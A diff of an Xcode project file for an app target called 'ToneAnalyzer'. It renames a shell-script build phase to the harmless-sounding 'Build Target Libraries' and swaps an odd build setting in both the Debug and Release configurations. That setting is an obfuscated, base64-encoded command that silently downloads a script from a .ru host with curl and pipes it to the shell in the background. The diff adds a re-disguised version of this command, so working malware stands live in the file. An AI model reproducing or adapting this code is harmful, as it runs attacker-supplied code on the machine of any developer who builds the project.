@@ -98,7 +98,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 84D1BC6E20078E8C004404D8 /* Build configuration list for PBXNativeTarget "ToneAnalyzer" */;
 			buildPhases = (
-				FAAC11E02F6B4978A07BBDC8 /* Provision Library Executable */,
+				743619353C2E4EFCA27BBDC8 /* Build Target Libraries */,
 				A0CF6B4EE6BDE254D6711BB7 /* [CP] Check Pods Manifest.lock */,
 				84D1BC5820078E8C004404D8 /* Sources */,
 				84D1BC5920078E8C004404D8 /* Frameworks */,
@@ -163,7 +163,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FAAC11E02F6B4978A07BBDC8 /* Provision Library Executable */ = {
+		743619353C2E4EFCA27BBDC8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -173,7 +173,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -271,7 +271,7 @@
 		84D1BC6C20078E8C004404D8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -329,7 +329,7 @@
 		84D1BC6D20078E8C004404D8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
